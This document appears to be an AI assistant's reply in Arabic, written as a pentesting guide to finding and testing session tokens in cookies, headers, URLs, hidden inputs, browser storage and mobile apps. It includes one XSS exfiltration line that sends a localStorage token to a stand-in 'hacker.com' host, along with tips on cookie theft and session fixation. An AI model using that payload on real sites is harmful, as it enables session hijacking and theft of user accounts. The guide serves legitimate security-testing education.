في **Pentesting**، نقطة البداية الأساسية لاكتشاف ثغرة في **Session Management** هي معرفة **أين تبحث** عن التوكنات (Session Tokens) التي يستخدمها التطبيق، وتحليل طريقة إدارتها.

---

## 🧭 أين تبحث عن ثغرات **Session Management**؟

### ١. **Cookies**
المكان الأكثر شيوعًا لتخزين Session ID أو Token هو **الكوكيز**.

#### 🔍 كيف تكتشف:
- من خلال Burp Suite أو DevTools → رؤوس الـ HTTP.
- مثال على Cookie يحتوي على Session ID:
```http
Set-Cookie: sessionid=abc123xyz; Path=/; Secure; HttpOnly
```

#### 🛠️ أدوات:
- **Burp Proxy** – لمراقبة الطلبات والاستجابات.
- **Cookie Manager Browser Extensions** – مثل EditThisCookie.

---

### ٢. **Authorization Headers**
في التطبيقات الحديثة (مثل REST APIs)، يتم استخدام توكنات JWT أو Bearer Tokens داخل رؤوس الطلب.

#### 🔍 أمثلة:
```http
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```
```http
X-Auth-Token: abc123xyz
```

#### 🛠️ أدوات:
- **Burp Repeater / Intruder**
- **Postman**

---

### ٣. **URL Parameters**
بعض التطبيقات تضع Session ID في الرابط.

#### 🔍 مثال:
```
https://target.com/dashboard?sessionid=abc123xyz
```

#### ⚠️ المشاكل:
- تسريب التوكن عبر Referer header.
- تخزينه في المتصفح history أو سجلات الخادم.

---

### ٤. **Hidden Inputs في النماذج HTML**
قد تجد Session Tokens مخزنة في نماذج HTML داخل `<input type="hidden">`.

#### 🔍 مثال:
```html
<input type="hidden" name="token" value="abc123xyz">
```

#### ✅ كيف تستغل:
- قد يُستخدم في Cross-Site Request Forgery (CSRF) إذا ما كان هناك حماية.

---

### ٥. **LocalStorage / SessionStorage (JavaScript Storage)**
في تطبيقات الويب الحديثة والـ Single Page Applications (SPA)، يتم تخزين التوكنات في ذاكرة المتصفح.

#### 🔍 مثال:
```javascript
localStorage.setItem('auth_token', 'abc123xyz');
```

#### ✅ كيف تستغل:
- باستخدام XSS لقراءة القيمة والتحكم فيها:
```javascript
fetch('https://hacker.com/steal?token=' + localStorage.getItem('auth_token'));
```

---

### ٦. **Custom Headers**
بعض التطبيقات تستخدم رؤوس غير قياسية لنقل التوكن.

#### 🔍 أمثلة:
```http
X-Session-ID: abc123xyz
Authentication-Token: xyz789
```

---

### ٧. **Mobile Apps & API Endpoints**
في التطبيقات المحمولة، يتم استخدام نفس أنواع التوكنات لكن بطريقة مختلفة:

#### 🔍 مصادر:
- SharedPreferences (Android)
- Keychain (iOS)
- API Requests (يمكن التقاطها باستخدام أدوات مثل **Burp Suite Mobile Proxy**)

---

## 🎯 الخطوات العملية في Pentesting

| الخطوة | الوصف |
|--------|-------|
| ١. جمع التوكنات | استخدم Burp لنقاط 1–6 أعلاه |
| ٢. اختبار قوة التوكن | هل هو عشوائي؟ هل يتغير؟ |
| ٣. فحص الأمان | Secure, HttpOnly, SameSite موجودة؟ |
| ٤. اختبار الثبات | هل الـ Session ID يتغير عند login/logout؟ |
| ٥. اختبار التسريب | هل التوكن في URL أو Referer؟ |
| ٦. اختبار الاستغلال | XSS, MITM, CSRF, Fixation, Prediction |

---

## 📋 Checklist: أين تبحث عن	Session Tokens؟

| المنطقة | نوع التوكن | أدوات الاكتشاف |
|---------|-------------|------------------|
| Cookies | PHPSESSID, JSESSIONID, sessionid | Burp Proxy, Browser Dev Tools |
| Headers | Authorization, Bearer, X-Token | Burp Repeater |
| URL Params | ?token=..., ?sess=... | Burp Proxy |
| Hidden Inputs | `<input type="hidden" name="token"...>` | View Source |
| JS Storage | localStorage/sessionStorage | Console in DevTools |
| Mobile Apps | Shared Preferences / Keychain | Burp Proxy for mobile traffic |
| Logs & Error Messages | تسريب التوكنات في الأخطاء | Fuzzing, Error-based enumeration |

---

## 💡 نصائح للمُخترق

- دائمًا ابدأ بتسجيل دخول واختبار كل طلب بعد ذلك.
- استخدم **Macros في Burp** لجمع الجلسات تلقائيًا.
- جرّب وضع توكنك الخاص قبل login (Session Fixation).
- ابحث عن أي تسريب للتوكن في الأخطاء أو الرسائل.
- استغل XSS إن وجدت لتسرق الكوكيز (HttpOnly = false).

---

إذا كنت عايزني أوضح لك **كيف تجمع التوكنات في كل مكان ده خطوة بخطوة باستخدام Burp** أو **كيف تشوف إذا كان التوكن ضعيف**، قول لي وانا أبدء في شرح عملي 🔥